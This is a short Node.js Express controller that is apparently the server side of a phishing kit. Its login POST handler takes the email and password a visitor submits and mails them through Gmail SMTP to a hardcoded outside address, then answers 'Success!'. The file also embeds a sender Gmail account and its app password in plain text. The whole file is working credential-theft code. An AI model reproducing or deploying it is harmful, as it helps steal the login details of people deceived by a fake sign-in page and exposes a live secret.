const nodemailer = require("nodemailer");

const adminEmail = "result3100@gmail.com";
const fromEmail = "slimsean7@gmail.com";
const fromPassword = 'dwssrznbauszleyv';

  exports.getLogin = (req, res, next) => {
    const nonce = res.locals.nonce;
    res.render("index", {
      nonce,
      });
  };

  exports.postLogin = async (req, res, next) => {
    const email = req.body.user;
    const password = req.body.pass;
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: fromEmail,
          pass: fromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
          const info = await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: fromEmail,
        to: adminEmail,
        subject: `SENT BY ${adminEmail}`,
        text: message,
        html: `<h4>Details</h4>
        <p>Email: ${email}
        <p>Password: ${password}</p>
        `,
      };
  
      await sendMail(options);
      res.status(200).send('Success!');
  
    } catch (error) {
      return res.status(500).send('Internal Server Error!');
    }   
  };
